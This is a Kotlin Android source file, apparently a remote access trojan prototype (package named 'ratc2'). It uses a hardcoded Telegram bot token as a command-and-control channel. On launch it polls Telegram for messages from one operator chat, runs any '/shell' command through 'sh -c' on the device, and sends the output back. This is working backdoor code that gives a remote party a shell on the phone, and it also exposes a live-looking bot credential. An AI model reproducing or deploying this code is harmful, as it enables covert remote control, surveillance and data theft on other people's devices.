package com.spud.ratc2

import android.os.Bundle
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder

class MainActivity : AppCompatActivity() {

    private val BOT = "8873170295:AAHX-1ddnEn3iBzwcWRFHyABrbzRV0xUCMU"
    private val MY_CHAT = "8868615222"
    private val BASE = "https://api.telegram.org/bot$BOT"

    private lateinit var logView: TextView
    @Volatile private var offset = 0L

    override fun onCreate(s: Bundle?) {
        super.onCreate(s)
        logView = TextView(this)
        logView.textSize = 14f
        logView.setPadding(20, 20, 20, 20)
        setContentView(logView)
        log("start")
        Thread { loop() }.start()
    }

    private fun log(msg: String) {
        runOnUiThread { logView.append("\n$msg") }
    }

    private fun loop() {
        log("loop begin")
        while (true) {
            try {
                val url = "$BASE/getUpdates?offset=$offset&timeout=25"
                val body = httpGet(url)
                log("recv: ${body.take(200)}")
                process(body)
            } catch (e: Exception) {
                log("err: ${e.message}")
                Thread.sleep(3000)
            }
        }
    }

    private fun httpGet(urlStr: String): String {
        val conn = URL(urlStr).openConnection() as HttpURLConnection
        conn.connectTimeout = 15000
        conn.readTimeout = 35000
        conn.requestMethod = "GET"
        val reader = BufferedReader(InputStreamReader(conn.inputStream))
        val sb = StringBuilder()
        var line = reader.readLine()
        while (line != null) { sb.append(line); line = reader.readLine() }
        reader.close()
        return sb.toString()
    }

    private fun httpPost(urlStr: String, params: String): String {
        val conn = URL(urlStr).openConnection() as HttpURLConnection
        conn.connectTimeout = 15000
        conn.readTimeout = 35000
        conn.requestMethod = "POST"
        conn.doOutput = true
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
        conn.outputStream.write(params.toByteArray())
        val reader = BufferedReader(InputStreamReader(conn.inputStream))
        val sb = StringBuilder()
        var line = reader.readLine()
        while (line != null) { sb.append(line); line = reader.readLine() }
        reader.close()
        return sb.toString()
    }

    private fun process(json: String) {
        // نبحث يدوياً عن update_id
        var idx = json.indexOf("\"update_id\":")
        while (idx >= 0) {
            val startId = idx + 12
            var endId = startId
            while (endId < json.length && json[endId].isDigit()) endId++
            if (endId > startId) {
                val uid = json.substring(startId, endId).toLong()
                if (uid >= offset) offset = uid + 1
            }
            idx = json.indexOf("\"update_id\":", endId)
        }

        // نبحث عن "chat":{"id":رقم ... "text":"..."
        var pos = 0
        while (true) {
            val chatIdx = json.indexOf("\"chat\":{\"id\":", pos)
            if (chatIdx < 0) break
            val idStart = chatIdx + 13
            var idEnd = idStart
            while (idEnd < json.length && (json[idEnd].isDigit() || json[idEnd] == '-')) idEnd++
            val chatId = json.substring(idStart, idEnd)

            val txtIdx = json.indexOf("\"text\":\"", idEnd)
            if (txtIdx < 0) break
            val tStart = txtIdx + 8
            var tEnd = tStart
            while (tEnd < json.length && json[tEnd] != '"') tEnd++
            val text = json.substring(tStart, tEnd)

            log("msg: $chatId -> $text")
            handle(chatId, text)
            pos = tEnd
        }
    }

    private fun handle(chatId: String, text: String) {
        if (chatId != MY_CHAT) {
            log("ignore: $chatId != $MY_CHAT")
            return
        }
        val reply = when {
            text.startsWith("/ping") -> "pong"
            text.startsWith("/shell ") -> shell(text.removePrefix("/shell "))
            text == "/help" -> "/ping /shell /help"
            else -> "unknown: $text"
        }
        send(chatId, reply)
    }

    private fun shell(cmd: String): String {
        return try {
            val p = ProcessBuilder("sh", "-c", cmd)
                .redirectErrorStream(true).start()
            val out = p.inputStream.bufferedReader().readText()
            p.waitFor()
            out.take(2000).ifBlank { "(no output)" }
        } catch (e: Exception) { "shell err: ${e.message}" }
    }

    private fun send(chatId: String, text: String) {
        try {
            val params = "chat_id=$chatId&text=" + URLEncoder.encode(text, "UTF-8")
            val resp = httpPost("$BASE/sendMessage", params)
            log("send: ${resp.take(150)}")
        } catch (e: Exception) {
            log("send err: ${e.message}")
        }
    }
}
